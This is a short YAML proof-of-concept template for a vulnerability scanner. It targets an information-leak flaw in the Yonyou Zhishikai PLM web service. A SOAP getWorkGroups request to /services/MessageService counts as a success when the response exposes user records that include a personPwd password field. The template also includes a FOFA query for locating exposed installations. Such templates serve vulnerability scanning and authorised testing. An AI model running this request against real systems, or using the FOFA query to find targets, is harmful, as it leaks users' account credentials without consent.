id: poc-yaml-zsiko-plm-getworkgroups-info-leak
info:
  name: 用友 智石开PLM getWorkGroups 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 智石开PLM
  fofa: body="智石开PLM"
requests:
- method: POST
  path: /services/MessageService
  headers:
    SOAPAction: null
    Content-Type: text/xml;charset=UTF-8
  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:mes=\"MessageService\">\n<soapenv:Header/>\n <soapenv:Body>\n<mes:getWorkGroups/>\n\
    \ </soapenv:Body>\n</soapenv:Envelope>"
  expression: "status_code == 200 && \ncontains(body,\"com.ufida.pdm.webservice.utu.entity.PersionVO\"\
    ) &&\ncontains(body,\"<personPwd\") &&\ncontains(content_type,\"text/xml\")\n"
variables: {}
transport: http
